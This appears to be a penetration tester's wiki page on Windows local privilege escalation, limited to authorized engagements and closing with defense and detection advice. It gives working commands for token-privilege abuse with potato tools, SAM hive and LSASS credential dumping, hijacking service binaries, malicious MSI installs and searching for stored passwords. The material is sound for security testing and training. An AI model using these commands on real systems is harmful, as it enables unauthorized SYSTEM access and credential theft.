# Windows — Privilege Escalation

Local escalation on a Windows host: normal/service user → **local admin / `NT AUTHORITY\SYSTEM`**. This is the deep-dive for the vectors summarised in [Windows Overview](Windows%20Overview.md). Domain-wide escalation (to Domain Admin) is separate — see [AD → Privilege Escalation](../AD/Privilege%20Escalation.md). Credential access after SYSTEM (LSASS/SAM/DPAPI) lives in [Lateral Movement & Credential Access](../AD/Lateral%20Movement%20%26%20Credential%20Access.md).

> **Authorized engagements only.** Automate the checks, but confirm each finding by hand before exploiting on a client box.

## Enumerate

```powershell
whoami /priv                 # token privileges — the fastest win (see below)
whoami /all                  # groups + SID
systeminfo                   # OS build/hotfixes -> missing-patch escalation
```

- **winPEAS** (`winPEASany.exe`), **PowerUp** (`Invoke-AllChecks`), **SharpUp**, **Seatbelt**, **PrivescCheck** automate everything below. Read the output; act on concrete findings.

## Token-privilege abuse (usually the quickest)

`whoami /priv` — these enabled privileges are near-instant SYSTEM:

- **`SeImpersonatePrivilege` / `SeAssignPrimaryToken`** (common on service accounts, IIS/MSSQL) → the **"potato"** family:

  ```text
  PrintSpoofer.exe -i -c cmd            # if the Print Spooler / named-pipe path works
  GodPotato -cmd "cmd /c whoami"        # modern, broad Windows 10/11 + Server support
  RoguePotato.exe -r <ip> -e cmd.exe    # when a redirector is needed
  ```

- **`SeBackupPrivilege` / `SeRestorePrivilege`** → read any file: copy the SAM/SYSTEM hives (or `NTDS.dit` on a DC) and parse offline.

  ```powershell
  reg save HKLM\SAM sam.save; reg save HKLM\SYSTEM system.save   # then secretsdump.py -sam ... LOCAL
  ```

- **`SeDebugPrivilege`** → dump LSASS (`procdump -ma lsass.exe`, comsvcs `MiniDump`) for credentials.

## Service misconfigurations

```powershell
# Unquoted service path with a space + a writable dir on the path
wmic service get name,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows"

# Services whose config/binary/registry you can modify
Get-CimInstance Win32_Service | ? {$_.StartMode -eq 'Auto'}   # + accesschk for ACLs
```

- **Unquoted service path:** plant `C:\Program.exe` (or an intermediate) that Windows runs as the service account (often SYSTEM).
- **Weak service permissions:** repoint a service you can reconfigure, then restart it.

  ```powershell
  sc qc <service>
  sc config <service> binPath= "C:\Windows\Temp\payload.exe"
  sc stop <service> & sc start <service>
  ```

- **Weak registry perms** on `HKLM\SYSTEM\CurrentControlSet\Services\<svc>` → change `ImagePath`.
- **DLL hijacking:** a service/app loading a missing DLL from a writable path → drop a malicious DLL.

## Registry & installer escalations

```powershell
# AlwaysInstallElevated — BOTH must be 0x1; then any .msi runs as SYSTEM
reg query HKCU\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
msiexec /quiet /qn /i evil.msi        # payload built with msfvenom -f msi
```

- **Autoruns / writable Run keys / startup folder** — a binary you can overwrite that runs as another user at logon.
- **Scheduled tasks** running as SYSTEM whose executable/working dir you can write (`schtasks /query /fo LIST /v`).

## UAC bypass (medium → high integrity)

If you're a local admin but only medium-integrity, bypass UAC to a full-integrity token — e.g. the **fodhelper** / **DiskCleanup** registry-hijack techniques. Note it; it's an integrity jump, not a new account.

## Credential hunting → escalate/pivot

```powershell
# Unattended installs & GPP (cpassword is AES-decryptable)
findstr /si password C:\Windows\Panther\*.xml C:\ProgramData\* 2>nul
# Autologon creds in the registry
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
# Saved creds you can reuse without seeing them
cmdkey /list ; runas /savecred /user:ADMIN cmd
```

DPAPI blobs, browser/Wi-Fi/RDP saved creds, and PowerShell history are all worth looting; recovered creds often escalate directly or feed [pass-the-hash](../AD/Lateral%20Movement%20%26%20Credential%20Access.md).

## Deliver the payload

Host it and pull it down — see [Impacket Toolkit → file transfer](../AD/Impacket%20Toolkit.md#step-2--deliver-tools-to-a-target-file-transfer); build EXE/MSI/DLL payloads with `msfvenom` (see [Metasploit](../Tools/Metasploit.md)).

## Defense / detection (for the report)

- Grant `SeImpersonate`/`SeBackup`/`SeDebug` only where required; prefer virtual/gMSA service accounts; enable **Credential Guard**.
- Quote all service paths, tighten service/registry ACLs, keep service binaries in protected dirs; use **LAPS** and remove standing local admin.
- Disable **AlwaysInstallElevated** via GPO; monitor service creation (**7045**), `sc config` changes, new scheduled tasks, and suspicious parent/child trees.
- Enable **ASR rules**, **script-block logging** (**4104**), and EDR; audit `whoami /priv`-style token abuse and LSASS access.

## References

- [Windows Overview](Windows%20Overview.md), [Powershell](Powershell.md), [AD → Privilege Escalation](../AD/Privilege%20Escalation.md), [Lateral Movement & Credential Access](../AD/Lateral%20Movement%20%26%20Credential%20Access.md), [Metasploit](../Tools/Metasploit.md).
- PayloadsAllTheThings (Windows privesc), HackTricks Windows local privilege escalation, the potato-family write-ups.
